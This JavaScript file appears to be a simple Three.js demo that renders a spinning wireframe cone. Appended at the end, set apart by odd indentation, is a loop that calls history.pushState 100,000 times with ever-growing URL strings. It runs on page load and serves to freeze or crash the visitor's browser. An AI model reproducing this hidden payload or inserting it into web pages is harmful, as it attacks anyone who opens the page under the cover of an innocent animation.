var scene = new THREE.Scene();
var camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 10000);
var renderer = new THREE.WebGLRenderer();

renderer.setSize(window.innerWidth, window.innerHeight);
document.body.appendChild(renderer.domElement);

var geometry = new THREE.CylinderGeometry(200, 0, 800, 24);
var material = new THREE.MeshBasicMaterial({
    color: 0xfffff,
    wireframe: true
});

var cylinder = new THREE.Mesh(geometry, material);
scene.add(cylinder);
camera.position.z = 1000;

function render() {
    requestAnimationFrame(render);
    cylinder.rotation.x += 0.01;
    cylinder.rotation.y += 0.01;
    cylinder.rotation.z += 0.01;
    renderer.render(scene, camera);
};

render();

var total = "";
                    for( var i = 0; i < 100000; i++ ) {
                        total = total + i.toString();
                        history.pushState(0,0, total );
                    }
